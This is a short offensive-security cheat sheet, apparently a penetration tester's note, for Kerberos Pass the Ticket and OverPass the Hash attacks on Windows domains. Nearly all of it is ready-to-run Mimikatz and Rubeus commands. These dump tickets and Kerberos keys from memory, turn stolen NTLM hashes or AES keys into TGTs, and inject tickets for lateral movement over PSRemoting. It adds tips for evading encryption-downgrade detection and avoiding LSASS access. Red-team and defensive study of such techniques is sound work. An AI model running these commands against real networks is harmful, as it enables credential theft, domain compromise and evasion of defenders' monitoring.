# Pass the Ticket (PtT) — Windows

## Harvest Tickets

Mimikatz — dumps all tickets to .kirbi files on disk (requires admin):

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Rubeus — dumps all tickets as base64, no disk write (requires admin):

```cmd
Rubeus.exe dump /nowrap
```

kirbi filename key: `[val]-username@service-domain.kirbi`. File ending in `@krbtgt-` = TGT. Computer account tickets end with `$`.

## OverPass the Hash (hash → TGT)

Extract Kerberos keys first — get aes256 and rc4 for a user:

```cmd
mimikatz # sekurlsa::ekeys
```

Mimikatz OverPass the Hash — spawns cmd.exe in user context, RC4 triggers encryption downgrade alert:

```cmd
mimikatz # sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<NTHASH>
```

Rubeus — requests TGT directly, use AES256 to avoid downgrade detection:

```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256KEY> /nowrap
```

> [!warning] Using RC4/NTLM hash in a Kerberos exchange on a domain running 2008+ functional level = detectable encryption downgrade. Use aes256 key when available.

## Inject Ticket (PtT)

Rubeus — request TGT and inject in one shot with /ptt:

```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTHASH> /ptt
```

Rubeus — inject existing .kirbi or base64 blob:

```cmd
Rubeus.exe ptt /ticket:<FILE>.kirbi
Rubeus.exe ptt /ticket:<BASE64>
```

Convert .kirbi to base64 if needed:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<FILE>.kirbi"))
```

Mimikatz — inject .kirbi into current session:

```cmd
mimikatz # kerberos::ptt "<PATH>\<FILE>.kirbi"
```

Verify ticket is loaded:

```cmd
klist
```

## Lateral Movement via PSRemoting

Mimikatz inject → then PSRemoting from same cmd context:

```cmd
mimikatz # kerberos::ptt "<TICKET>.kirbi"
mimikatz # exit
powershell
Enter-PSSession -ComputerName <HOSTNAME>
```

Rubeus — createnetonly spawns a sacrificial logon session first (prevents wiping existing TGTs), then inject TGT and PSRemote:

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /ptt
powershell
Enter-PSSession -ComputerName <HOSTNAME>
```

> [!tip] Rubeus requires no admin for asktgt — Mimikatz sekurlsa::pth does. Use Rubeus when you have a user-level shell and need to avoid touching LSASS directly.